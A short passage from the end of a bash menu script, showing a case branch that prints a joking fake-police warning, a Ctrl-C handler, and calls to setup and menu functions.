			echo -ne "\n[!]  YOUR A GOOOOOOFFFFFFFF RCMP HAVE YOUR LOCATION"
			{ sleep 20; menu;};;
	  
	esac
	
}	


control_c()
{
  echo -e "${RESETBG}"
  echo -e "${RESETFG}"
  clear
  exit 1
}


trap control_c SIGINT



check_os_and_install_packages
check_root_and_os
pid_kill
menu
